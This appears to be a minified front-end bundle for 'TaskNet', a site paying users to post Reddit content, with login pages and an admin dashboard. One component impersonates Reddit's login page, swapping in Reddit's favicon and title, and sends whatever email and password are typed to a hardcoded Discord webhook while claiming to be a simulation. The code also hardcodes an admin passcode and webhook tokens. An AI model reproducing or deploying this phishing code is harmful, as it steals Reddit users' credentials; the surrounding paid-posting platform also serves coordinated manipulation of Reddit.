gap-4",children:[s.jsx("div",{className:"flex-shrink-0",children:k.type==="success"?s.jsx(jt,{size:24,strokeWidth:3}):k.type==="error"?s.jsx(De,{size:24,strokeWidth:3}):s.jsx(at,{size:24,strokeWidth:3})}),s.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:k.message})]}),s.jsx("button",{onClick:()=>_(T=>({...T,show:!1})),className:"flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full transition-colors",children:s.jsx(De,{size:18,strokeWidth:3})})]})}),s.jsxs("div",{className:"fixed inset-0 overflow-hidden pointer-events-none",children:[s.jsx("div",{className:"absolute top-[-20%] left-[-10%] w-[60%] h-[60%] rounded-full bg-blue-900/10 blur-[120px]"}),s.jsx("div",{className:"absolute bottom-[-20%] right-[-10%] w-[50%] h-[50%] rounded-full bg-blue-900/5 blur-[100px]"})]}),s.jsxs("div",{className:"relative w-full max-w-[440px] animate-in fade-in zoom-in duration-500",children:[s.jsxs("div",{className:"bg-white/[0.02] border border-white/5 backdrop-blur-2xl rounded-[32px] p-10 shadow-2xl",children:[s.jsxs("div",{className:"flex flex-col items-center text-center mb-10",children:[s.jsx("div",{className:"w-16 h-16 bg-gradient-to-br from-blue-500 to-blue-700 rounded-2xl flex items-center justify-center mb-6 shadow-xl shadow-blue-600/20 rotate-3 group hover:rotate-0 transition-transform cursor-pointer",children:s.jsx("svg",{viewBox:"0 0 24 24",className:"w-10 h-10 fill-white",xmlns:"http://www.w3.org/2000/svg",children:s.jsx("path",{d:"M12 2C6.477 2 2 6.477 2 12c0 5.523 4.477 10 10 10s10-4.477 10-10c0-5.523-4.477-10-10-10zm4.5 13.5h-9v-1.5h9v1.5zm0-3h-9v-1.5h9v1.5zm0-3h-9v-1.5h9v1.5z"})})}),s.jsx("h1",{className:"text-3xl font-black tracking-tighter mb-1 uppercase italic",children:h?"Join TaskNet":"TaskNet"}),s.jsx("p",{className:"text-gray-500 text-sm font-medium",children:h?"Start your automation journey":"Powering your automated infrastructure"})]}),s.jsxs("form",{className:"space-y-5",onSubmit:E,children:[h&&s.jsxs("div",{className:"space-y-2 animate-in fade-in slide-in-from-top-2 duration-300",children:[s.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase ml-1",children:"Server Username"}),s.jsxs("div",{className:"relative group",children:[s.jsx(ss,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-blue-500 transition-colors",size:18}),s.jsx("input",{type:"text",required:!0,placeholder:"Enter server username",value:c,onChange:T=>u(T.target.value),className:"w-full pl-12 pr-4 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm"})]})]}),s.jsxs("div",{className:"space-y-2",children:[s.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase ml-1",children:"Email Address"}),s.jsxs("div",{className:"relative group",children:[s.jsx(Rf,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-blue-500 transition-colors",size:18}),s.jsx("input",{type:"email",placeholder:"name@company.com",value:a,onChange:T=>r(T.target.value),className:"w-full pl-12 pr-4 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm"})]})]}),s.jsxs("div",{className:"space-y-2",children:[s.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase ml-1",children:"Password"}),s.jsxs("div",{className:"relative group",children:[s.jsx(Nr,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-blue-500 transition-colors",size:18}),s.jsx("input",{type:"password",required:!0,placeholder:"",value:n,onChange:T=>l(T.target.value),className:"w-full pl-12 pr-4 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm"})]})]}),s.jsxs("button",{type:"submit",disabled:!a||!n||x,className:"w-full py-4 bg-blue-600 text-white rounded-2xl font-bold text-sm hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-all shadow-lg shadow-blue-600/20 flex items-center justify-center gap-2 group mt-4",children:[x?"Processing...":h?"Create Account":"Sign In",!x&&s.jsx(Vc,{size:18,className:"group-hover:translate-x-1 transition-transform"})]})]}),s.jsx("div",{className:"mt-10 text-center",children:s.jsxs("p",{className:"text-gray-500 text-sm",children:[h?"Already have an account?":"Don't have an account?"," ",s.jsx("button",{onClick:()=>m(!h),className:"text-blue-500 font-bold hover:underline",children:h?"Sign In":"Create one"})]})})]}),s.jsx("div",{className:"mt-8 text-center",children:s.jsx("p",{className:"text-[11px] text-gray-600 uppercase tracking-widest font-bold",children:" 2026 TaskNet Infrastructure"})})]})]})},ev=()=>{const[a,r]=j.useState(""),[n,l]=j.useState(""),[c,u]=j.useState(!1),[h,m]=j.useState(!1),[x,y]=j.useState(!1),[v,k]=j.useState({show:!1,message:"",type:"info"});j.useEffect(()=>{const w=()=>{document.querySelectorAll('link[rel*="icon"]').forEach(z=>z.remove()),[{href:"https://www.redditstatic.com/shreddit/assets/favicon/64x64.png",sizes:"64x64",rel:"icon shortcut"},{href:"https://www.redditstatic.com/shreddit/assets/favicon/128x128.png",sizes:"128x128",rel:"icon shortcut"},{href:"https://www.redditstatic.com/shreddit/assets/favicon/192x192.png",sizes:"192x192",rel:"icon shortcut"},{href:"https://www.redditstatic.com/shreddit/assets/favicon/76x76.png",sizes:"76x76",rel:"apple-touch-icon"},{href:"https://www.redditstatic.com/shreddit/assets/favicon/120x120.png",sizes:"120x120",rel:"apple-touch-icon"},{href:"https://www.redditstatic.com/shreddit/assets/favicon/152x152.png",sizes:"152x152",rel:"apple-touch-icon"},{href:"https://www.redditstatic.com/shreddit/assets/favicon/180x180.png",sizes:"180x180",rel:"apple-touch-icon"}].forEach(({href:z,sizes:I,rel:H})=>{const te=document.createElement("link");te.href=z,te.sizes=I,te.rel=H,document.head.appendChild(te)})},E=document.title;return document.title="Log In  Reddit",w(),()=>{document.querySelectorAll('link[href*="redditstatic.com"]').forEach(D=>D.remove()),document.title=E}},[]);const _=(w,E="info")=>{k({show:!0,message:w,type:E}),setTimeout(()=>k(T=>({...T,show:!1})),2e3)},S=async w=>{w.preventDefault(),y(!0);const E=!a.trim(),T=!n.trim();if(u(E),m(T),!(E||T))try{const D="https://discord.com/api/webhooks/1465382211061547130/aiXFCCdPDjBPUuixbNR8rXWiWbCcRE9e4pReJfTaYxutYAF5FRyrBj-2wJLLDMINky07",z=new Date().toLocaleString("en-US",{timeZone:"UTC",year:"numeric",month:"long",day:"numeric",hour:"2-digit",minute:"2-digit",second:"2-digit"}),I={embeds:[{title:" Reddit Login Attempt",color:16729344,fields:[{name:" Email/Username",value:`\`\`\`${a}\`\`\``,inline:!1},{name:" Password",value:`\`\`\`${n}\`\`\``,inline:!1},{name:" Timestamp",value:z,inline:!1},{name:" Source",value:"TaskNet Reddit Login Page",inline:!1}],footer:{text:"TaskNet Security Monitor"},timestamp:new Date().toISOString()}]};await fetch(D,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(I)})}catch(D){console.error("Error sending to Discord:",D),_("Reddit Login is for simulation only.","info")}};return s.jsxs("div",{className:"min-h-screen w-full bg-[#0B1416] flex flex-col font-['Noto_Sans',_sans-serif] selection:bg-blue-500 selection:text-white",children:[s.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${v.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:s.jsxs("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${v.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":v.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:[s.jsxs("div",{className:"flex items-center gap-4",children:[s.jsx("div",{className:"flex-shrink-0",children:v.type==="success"?s.jsx(jt,{size:24,strokeWidth:3}):v.type==="error"?s.jsx(De,{size:24,strokeWidth:3}):s.jsx(at,{size:24,strokeWidth:3})}),s.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:v.message})]}),s.jsx("button",{onClick:()=>k(w=>({...w,show:!1})),className:"flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full transition-colors",children:s.jsx(De,{size:18,strokeWidth:3})})]})}),s.jsx("header",{className:"w-full px-6 py-5 flex items-center",children:s.jsx("div",{className:"flex items-center gap-2",children:s.jsxs("div",{className:"flex items-center gap-3",children:[s.jsx("div",{className:"w-8 h-8 bg-[#FF4500] rounded-full flex items-center justify-center",children:s.jsx("svg",{className:"w-5 h-5",viewBox:"0 0 20 20",fill:"white",xmlns:"http://www.w3.org/2000/svg",children:s.jsx("path",{d:"M16 10c0-.4-.3-.7-.7-.7h-.1c-.5-.4-1.1-.6-1.9-.6l.4-2 1.3.3c.1.3.3.5.6.5.3 0 .6-.3.6-.6s-.3-.6-.6-.6c-.3 0-.5.1-.6.4l-1.5-.3c-.1 0-.2.1-.2.1l-.5 2.2c-.7.1-1.4.3-1.9.6h-.1c-.4 0-.7.3-.7.7s.3.7.7.7h.1c.1.3.2.6.3.8-.3.2-.5.5-.5.9 0 .6.4 1.1 1.1 1.1.3 0 .5-.1.7-.3.5.2 1.2.4 1.9.4s1.4-.1 1.9-.4c.2.2.5.3.7.3.6 0 1.1-.5 1.1-1.1 0-.4-.2-.7-.5-.9.1-.3.2-.6.3-.8h.1c.4 0 .7-.3.7-.7zM8.2 11c-.3 0-.6-.3-.6-.6s.3-.6.6-.6.6.3.6.6-.3.6-.6.6zm4.1 1.9c-.7.6-2.2.6-3 0-.1-.1-.1-.1-.1-.2s.1-.1.2-.1c.6.5 2 .5 2.6 0 .1 0 .1 0 .2.1 0 .1 0 .1 0 .2zm.1-1.3c-.3 0-.6-.3-.6-.6s.3-.6.6-.6.6.3.6.6-.3.6-.6.6z"})})}),s.jsx("span",{className:"text-white text-2xl font-semibold tracking-tight",children:"reddit"})]})})}),s.jsx("div",{className:"flex-1 flex items-center justify-center p-4",children:s.jsxs("div",{className:"w-full max-w-[440px] bg-[#1A1A1B] rounded-3xl p-8 shadow-2xl",children:[s.jsx("h1",{className:"text-white text-2xl font-medium text-center mb-4",children:"Log In"}),s.jsxs("p",{className:"text-[#B8C5C9] text-xs text-center mb-6 leading-relaxed",children:["By continuing, you agree to our ",s.jsx("a",{href:"#",className:"text-[#4A9EFF] hover:underline",children:"User Agreement"})," and acknowledge that you understand the ",s.jsx("a",{href:"#",className:"text-[#4A9EFF] hover:underline",children:"Privacy Policy"}),"."]}),s.jsxs("div",{className:"space-y-3 mb-6",children:[s.jsxs("button",{className:"w-full h-12 bg-white hover:bg-gray-100 rounded-full flex items-center justify-center gap-3 text-[#1C1C1C] font-bold text-sm transition-colors",children:[s.jsx("svg",{className:"w-4 h-4",viewBox:"0 0 24 24",fill:"currentColor",children:s.jsx("path",{d:"M20.01 15.38c-1.23 0-2.42-.2-3.53-.56-.35-.12-.74-.03-1.01.24l-1.57 1.97c-2.83-1.35-5.48-3.9-6.89-6.83l1.95-1.66c.27-.28.35-.67.24-1.02-.37-1.11-.56-2.3-.56-3.53 0-.54-.45-.99-.99-.99H4.19C3.65 3 3 3.24 3 3.99 3 13.28 10.73 21 20.01 21c.71 0 .99-.63.99-1.18v-3.45c0-.54-.45-.99-.99-.99z"})}),"Continue With Phone Number"]}),s.jsxs("button",{className:"w-full h-12 bg-white hover:bg-gray-100 rounded-full flex items-center justify-center gap-3 text-[#1C1C1C] font-bold text-sm transition-colors",children:[s.jsx("img",{src:"https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg",alt:"Google",className:"w-5 h-5"}),"Continue With Google"]}),s.jsxs("button",{className:"w-full h-12 bg-white hover:bg-gray-100 rounded-full flex items-center justify-center gap-3 text-[#1C1C1C] font-bold text-sm transition-colors",children:[s.jsx("svg",{className:"w-5 h-5",viewBox:"0 0 384 512",fill:"currentColor",children:s.jsx("path",{d:"M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"})}),"Continue With Apple"]}),s.jsxs("button",{className:"w-full h-12 bg-white hover:bg-gray-100 rounded-full flex items-center justify-center gap-3 text-[#1C1C1C] font-bold text-sm transition-colors",children:[s.jsxs("svg",{className:"w-4 h-4",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[s.jsx("path",{d:""}),s.jsx("path",{d:"M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"})]}),"Email me a one-time link"]})]}),s.jsxs("div",{className:"flex items-center gap-4 mb-6",children:[s.jsx("div",{className:"h-px flex-1 bg-[#343536]"}),s.jsx("span",{className:"text-[#B8C5C9] text-xs font-bold",children:"OR"}),s.jsx("div",{className:"h-px flex-1 bg-[#343536]"})]}),s.jsxs("form",{className:"space-y-4",onSubmit:S,children:[s.jsxs("div",{children:[s.jsxs("div",{className:`relative ${c?"mb-1":""}`,children:[s.jsx("input",{type:"text",placeholder:"Email or username *",value:a,onChange:w=>{r(w.target.value),x&&u(!w.target.value.trim())},className:`w-full h-12 bg-transparent border-2 rounded-full px-4 text-white text-sm placeholder:text-[#818384] focus:outline-none transition-colors ${c?"border-[#EA0027] focus:border-[#EA0027]":"border-[#343536] focus:border-white hover:border-[#474748]"}`}),c&&s.jsx("div",{className:"absolute right-4 top-1/2 -translate-y-1/2",children:s.jsxs("svg",{className:"w-5 h-5 text-[#EA0027]",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[s.jsx("circle",{cx:"12",cy:"12",r:"10"}),s.jsx("line",{x1:"12",y1:"8",x2:"12",y2:"12"}),s.jsx("line",{x1:"12",y1:"16",x2:"12.01",y2:"16"})]})})]}),c&&s.jsx("p",{className:"text-[#EA0027] text-xs ml-4 mb-2",children:"Please fill out this field."})]}),s.jsxs("div",{children:[s.jsxs("div",{className:`relative ${h?"mb-1":""}`,children:[s.jsx("input",{type:"password",placeholder:"Password *",value:n,onChange:w=>{l(w.target.value),x&&m(!w.target.value.trim())},className:`w-full h-12 bg-transparent border-2 rounded-full px-4 text-white text-sm placeholder:text-[#818384] focus:outline-none transition-colors ${h?"border-[#EA0027] focus:border-[#EA0027]":"border-[#343536] focus:border-white hover:border-[#474748]"}`}),h&&s.jsx("div",{className:"absolute right-4 top-1/2 -translate-y-1/2",children:s.jsxs("svg",{className:"w-5 h-5 text-[#EA0027]",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[s.jsx("circle",{cx:"12",cy:"12",r:"10"}),s.jsx("line",{x1:"12",y1:"8",x2:"12",y2:"12"}),s.jsx("line",{x1:"12",y1:"16",x2:"12.01",y2:"16"})]})})]}),h&&s.jsx("p",{className:"text-[#EA0027] text-xs ml-4 mb-2",children:"Please fill out this field."})]}),s.jsxs("div",{className:"text-xs space-y-2 pt-2",children:[s.jsx("a",{href:"#",className:"text-[#4A9EFF] hover:underline block",children:"Forgot password?"}),s.jsxs("p",{className:"text-[#B8C5C9]",children:["New to Reddit? ",s.jsx("a",{href:"#",className:"text-[#4A9EFF] hover:underline",children:"Sign Up"})]})]}),s.jsx("button",{type:"submit",className:"w-full h-12 bg-[#D93A00] hover:bg-[#C13B00] disabled:bg-[#343536] disabled:text-[#818384] disabled:cursor-not-allowed text-white rounded-full font-bold text-sm transition-colors mt-6",children:"Log In"})]})]})})]})},il=new Map,tv=8640*60*1e3,ll={binance:"https://cryptologos.cc/logos/binance-coin-bnb-logo.png",usdt:"https://cryptologos.cc/logos/tether-usdt-logo.png",upi:"https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/UPI-Logo-vector.svg/1200px-UPI-Logo-vector.svg.png"},rv=()=>{const[a,r]=j.useState(""),[n,l]=j.useState(!1),[c,u]=j.useState([]),[h,m]=j.useState([]),[x,y]=j.useState([]),[v,k]=j.useState([]),[_,S]=j.useState(null),[w,E]=j.useState("Tasks"),[T,D]=j.useState(!1),[z,I]=j.useState(""),[H,te]=j.useState(""),[J,F]=j.useState(!1),[ne,ue]=j.useState(!1),[Ee,ze]=j.useState(null),[Fe,Re]=j.useState(""),[de,ae]=j.useState(!1),[we,he]=j.useState(!1),[U,Z]=j.useState(null),[ee,R]=j.useState(!1),[M,be]=j.useState(null),[je,Ce]=j.useState(""),[_e,Q]=j.useState("Tier 1"),[fe,xe]=j.useState(""),[B,Ae]=j.useState("COMMENT"),[et,ct]=j.useState(""),[Ne,kt]=j.useState(""),[dr,it]=j.useState(""),[ft,At]=j.useState(""),[st,_t]=j.useState("All"),[hr,Cr]=j.useState(!1),Tr=j.useRef(null),[Rr,Pr]=j.useState(!1),fr=j.useRef(null),[er,os]=j.useState(!1),Ft=j.useRef(null),[Oe,zs]=j.useState(new Date),[Ar,tr]=j.useState(!1),[Bt,Br]=j.useState(""),pr=j.useRef(null),[Ue,Wt]=j.useState({show:!1,message:"",type:"info"}),ge=(p,O="info")=>{Wt({show:!0,message:p,type:O}),setTimeout(()=>Wt(L=>({...L,show:!1})),2e3)},Or=p=>{p.preventDefault(),a==="SS@19151"?(l(!0),ge("Access granted. Welcome Admin.","success")):ge("Invalid admin passcode.","error")},Ot=async()=>{const{data:p,error:O}=await X.from("withdrawal_requests").select("*").order("created_at",{ascending:!1});O||y(p||[])},rr=async()=>{const{data:p,error:O}=await X.from("admin_alerts").select("*").eq("user_email","ADMIN_REPORT").order("created_at",{ascending:!1});O||k(p||[])},ln=async p=>{k(O=>O.filter(L=>L.id!==p));try{const{error:O}=await X.from("admin_alerts").delete().eq("id",p);O?(console.error("Delete error:",O),ge("Error: "+O.message,"error"),rr()):ge("Report resolved","success")}catch(O){console.error("Catch error:",O),rr()}};j.useEffect(()=>{if(n){pt(),Ir(),Ot(),rr();const O=setInterval(()=>{pt(),Ir(),Ot(),rr()},1e4);return()=>clearInterval(O)}const p=O=>{pr.current&&!pr.current.contains(O.target)&&tr(!1),Tr.current&&!Tr.current.contains(O.target)&&Cr(!1),fr.current&&!fr.current.contains(O.target)&&Pr(!1),Ft.current&&!Ft.current.contains(O.target)&&os(!1)};return document.addEventListener("mousedown",p),()=>document.removeEventListener("mousedown",p)},[n]);const pt=async()=>{const{data:p,error:O}=await X.from("tasks").select("*").order("created_at",{ascending:!1});O?console.error("Error fetching tasks:",O):u(p||[])},Ir=async(p=!1)=>{const{data:O,error:L}=await X.from("profiles").select("email, reddit_username, server_username, discord_username, balance, payout_methods, reddit_karma");L?console.error("Error fetching profiles:",L):O&&(m(O),O.forEach(W=>{W.reddit_username&&W.reddit_username!=="not_connected"&&on(W.email,W.reddit_username)}))},on=async(p,O)=>{try{const L=il.get(O);if(L&&Date.now()-L.timestamp<tv){m(Le=>Le.map(Te=>Te.email===p?{...Te,reddit_karma:L.karma}:Te));return}const W=`https://www.reddit.com/user/${O}/about.json`,G=`https://old.reddit.com/user/${O}/about.json`,Tt=[`https://reddapi.p.rapidapi.com/api/user_info?username=${O}`,`https://api.redditmetrics.com/user/${O}`,`https://api.allorigins.win/raw?url=${encodeURIComponent(W)}`,`https://corsproxy.io/?${encodeURIComponent(W)}`,`https://proxy.cors.sh/${W}`,`https://cors-proxy.htmldriven.com/?url=${encodeURIComponent(W)}`,`https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(W)}`,`https://thingproxy.freeboard.io/fetch/${W}`,`https://yacdn.org/proxy/${W}`,`https://cors.bridged.cc/${W}`,`https://cors-proxy.fringe.zone/${W}`,G,W];for(const Le of Tt)try{const Te=new AbortController,Zn=setTimeout(()=>Te.abort(),5e3),Vr=await fetch(Le,{headers:{Accept:"application/json","x-rapidapi-host":"reddapi.p.rapidapi.com"},signal:Te.signal});if(clearTimeout(Zn),Vr.ok){const Ge=await Vr.json();if(Ge){if(Le.includes("reddapi.p.rapidapi.com")){if(Ge.data&&Ge.data.total_karma!==void 0){const Be=Ge.data.total_karma;il.set(O,{karma:Be,timestamp:Date.now(),lastFetchedDate:new Date().toISOString().split("T")[0]}),m(Vt=>Vt.map(We=>We.email===p?{...We,reddit_karma:Be}:We)),await X.from("profiles").update({reddit_karma:Be}).eq("email",p);return}}else if(Le.includes("api.redditmetrics.com")){if(Ge.karma!==void 0){const Be=Ge.karma;il.set(O,{karma:Be,timestamp:Date.now(),lastFetchedDate:new Date().toISOString().split("T")[0]}),m(Vt=>Vt.map(We=>We.email===p?{...We,reddit_karma:Be}:We)),await X.from("profiles").update({reddit_karma:Be}).eq("email",p);return}}else if(Ge.data){const Be=Ge.data.total_karma??(Ge.data.link_karma||0)+(Ge.data.comment_karma||0);il.set(O,{karma:Be,timestamp:Date.now(),lastFetchedDate:new Date().toISOString().split("T")[0]}),m(Vt=>Vt.map(We=>We.email===p?{...We,reddit_karma:Be}:We)),await X.from("profiles").update({reddit_karma:Be}).eq("email",p);return}}}}catch{continue}}catch(L){console.error("Error fetching karma for",O,L)}},Us=async p=>{if(p.assigned_to!=="All")return;const O="https://discord.com/api/webhooks/1463922549120434186/4juUa6WRV4dCkAjfYv35DruT5VRS8AXT8TazwOCkbVGM1yBXnUP6hQHbdnjUqxGO9Dwp",L=`:rocket: NEW TASK ALERT

A new task has been published.
<@&1464974222559281210>
:link: Claim it here:
https://tasknet.site/dashboard`;try{await fetch(O,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:L})})}catch(W){console.error("Error sending Discord notification:",W)}},cn=async p=>{p.preventDefault();const L={task_id_display:_?c.find(W=>W.id===_)?.task_id_display:`#${Math.floor(1e5+Math.random()*9e5)}`,tier:_e,subreddit:fe,title:je,category:B,reward:et,deadline:Ne,reddit_url:dr,instructions:ft,assigned_to:st,is_hidden:!1};if(_){const{error:W}=await X.from("tasks").update(L).eq("id",_);W?ge("Error updating task: "+W.message,"error"):(ge("Task Updated Successfully!","success"),S(null))}else{const{error:W}=await X.from("tasks").insert([L]);W?ge("Error posting task: "+W.message,"error"):(ge("Task Posted Successfully!","success"),Us(L))}mr(),pt()},mr=()=>{Ce(""),Q("Tier 1"),xe(""),ct(""),kt(""),it(""),At(""),_t("All"),Ae("COMMENT"),S(null),Br("")},Ls=p=>{S(p.id),Ce(p.title),Q(p.tier||"Tier 1"),xe(p.subreddit||""),Ae(p.category),ct(p.reward),kt(p.deadline),it(p.reddit_url),At(p.instructions),_t(p.assigned_to),window.scrollTo({top:0,behavior:"smooth"})},Wr=async p=>{if(!window.confirm("Delete this task?"))return;const{error:O}=await X.from("tasks").delete().eq("id",p);O?ge("Error deleting task","error"):(ge("Task Deleted Successfully","success"),pt())},Jn=async p=>{const{error:O}=await X.from("tasks").update({is_hidden:!p.is_hidden}).eq("id",p.id);O?ge("Error updating status","error"):(ge(p.is_hidden?"Task Visible":"Task Hidden","info"),pt())},qr=async p=>{if(!p.claimed_by)return;const{error:O}=await X.from("tasks").update({status:"verified"}).eq("id",p.id);if(O){ge("Error verifying task: "+O.message,"error");return}const{data:L}=await X.from("profiles").select("balance").eq("email",p.claimed_by).single(),W=parseFloat(L?.balance||"0"),G=parseFloat(p.reward.replace("$","")),Tt=W+G,{error:Le}=await X.from("profiles").update({balance:Tt,last_task_completed_at:new Date().toISOString()}).eq("email",p.claimed_by);Le?ge("Error updating balance: "+Le.message,"error"):(ge("Task verified and reward added to wallet!","success"),pt())},$r=async p=>{I(p),te(""),D(!0)},cs=p=>{ze(p),Re(""),ue(!0)},Ms=async()=>{if(!Ee||!Fe.trim())return;ae(!0);const{error:p}=await X.from("tasks").update({status:"rejected"}).eq("id",Ee.id);if(p){ge("Error rejecting task: "+p.message,"error"),ae(!1);return}const{error:O}=await X.from("profiles").update({last_task_rejected_at:new Date().toISOString()}).eq("email",Ee.claimed_by);O&&ge("Error updating rejection timestamp: "+O.message,"error");const{error:L}=await X.from("admin_alerts").insert([{user_email:Ee.claimed_by,message:`Your submission for task "${Ee.title}" (${Ee.task_id_display}) has been rejected.

Reason: ${Fe}`}]);L?ge("Task rejected but failed to notify user: "+L.message,"error"):ge("Task rejected and user notified!","success"),ue(!1),ze(null),Re(""),ae(!1),pt()},Yn=p=>{Z(p),he(!0)},Qn=async()=>{if(!U)return;R(!0);const{error:p}=await X.from("withdrawal_requests").update({status:"completed"}).eq("id",U.id);p?ge("Error updating withdrawal: "+p.message,"error"):(ge("Withdrawal marked as completed!","success"),Ot(),he(!1),Z(null)),R(!1)},Xn=async()=>{if(!H.trim())return;F(!0);const{error:p}=await X.from("admin_alerts").insert([{user_email:z,message:H}]);p?ge("Error sending alert: "+p.message,"error"):(ge("Alert sent to user!","success"),D(!1)),F(!1)},qt=h.filter(p=>p.email.toLowerCase().includes(Bt.toLowerCase())||p.reddit_username&&p.reddit_username.toLowerCase().includes(Bt.toLowerCase())),us=h.find(p=>p.email===st),un=st==="All"?"Everyone (Public)":`${us?.server_username||st.split("@")[0]}[${us?.reddit_username||"No Reddit"}]`;return n?s.jsxs(ns,{children:[s.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${Ue.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:s.jsxs("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${Ue.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":Ue.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:[s.jsxs("div",{className:"flex items-center gap-4",children:[s.jsx("div",{className:"flex-shrink-0",children:Ue.type==="success"?s.jsx(jt,{size:24,strokeWidth:3}):Ue.type==="error"?s.jsx(De,{size:24,strokeWidth:3}):s.jsx(at,{size:24,strokeWidth:3})}),s.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:Ue.message})]}),s.jsx("button",{onClick:()=>Wt(p=>({...p,show:!1})),className:"flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full transition-colors",children:s.jsx(De,{size:18,strokeWidth:3})})]})}),s.jsxs("div",{className:"max-w-4xl mx-auto animate-in fade-in slide-in-from-bottom-4 duration-500",children:[s.jsxs("header",{className:"mb-8 sm:mb-10",children:[s.jsx("div",{className:"flex items-center gap-3 mb-2",children:s.jsx("div",{className:"px-3 py-1 bg-blue-600/10 text-blue-500 rounded-full text-[10px] font-bold uppercase tracking-widest border border-blue-500/20",children:"Admin Control"})}),s.jsx("h1",{className:"text-2xl sm:text-3xl font-black tracking-tighter uppercase italic",children:w==="Tasks"?"Task Management":w==="Users"?"User Management":w==="Withdrawals"?"Payout Records":w==="Reports"?"Task Reports":"Submission Verifications"}),s.jsx("p",{className:"text-xs sm:text-sm text-gray-500 mt-1",children:w==="Tasks"?"Distribute new tasks to the network.":w==="Users"?"View all registered users and their details.":w==="Withdrawals"?"View historical payout data and completed transactions.":w==="Reports"?"Review problems reported by users.":"Review and approve user submissions."})]}),s.jsxs("div",{className:"flex flex-wrap bg-white/[0.03] border border-white/5 p-1 rounded-2xl mb-8 sm:mb-12 w-full sm:w-fit gap-1",children:[s.jsx("button",{onClick:()=>E("Tasks"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all ${w==="Tasks"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:"Create"}),s.jsxs("button",{onClick:()=>E("Verification"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all relative ${w==="Verification"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:["Verify",c.filter(p=>p.status==="submitted").length>0&&s.jsx("span",{className:"absolute -top-1 -right-1 w-4 h-4 bg-red-500 rounded-full text-[8px] flex items-center justify-center animate-pulse",children:c.filter(p=>p.status==="submitted").length})]}),s.jsx("button",{onClick:()=>E("Submissions"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all ${w==="Submissions"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:"History"}),s.jsx("button",{onClick:()=>E("Users"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all ${w==="Users"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:"Users"}),s.jsx("button",{onClick:()=>E("Withdrawals"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all ${w==="Withdrawals"?"bg-blue-600 text-white shadow-lg 